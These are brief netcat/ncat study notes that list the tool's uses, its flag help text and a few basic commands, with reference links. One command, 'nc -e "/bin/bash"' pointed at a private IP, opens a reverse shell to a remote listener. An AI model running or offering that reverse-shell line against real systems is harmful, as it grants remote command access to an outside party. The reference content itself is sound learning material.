# ncat
https://www.redhat.com/sysadmin/ncat-security

* The ncat command is part of the nmap suite and was written specifically for it.,

Netcat is one of the powerful networking tool, security tool or network monitoring tool. It acts like cat command over a network. It is even considered as a Swiss army knife of networking tools. It is generally used for the following reasons:

Operation related to TCP, UDP or UNIX-domain sockets
Port Scanning
Port listening
Port redirection
open Remote connections
Read/Write data across network
Network debugging
Network daemon testing
Simple TCP proxies
A Socks or HTTP Proxy Command for ssh
https://www.geeksforgeeks.org/practical-uses-of-ncnetcat-command-in-linux/
https://www.redhat.com/sysadmin/ncat-security
https://www.oreilly.com/library/view/practical-web-penetration/9781788624039/a6bdd6aa-c564-4172-9c31-c15ae1a09bd4.xhtml

# Flags

options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]

# Basic commands

- nc 192.168.46.128 8000
- nc -nlvkp 8000
- nc -e "/bin/bash" 192.168.46.128 8000
- nc -nv 10.129.42.253 21               (banner grabbing for HTTP,Tools like netcat and fscan cannot connect to SSL services in order
                                        to grab banners.)
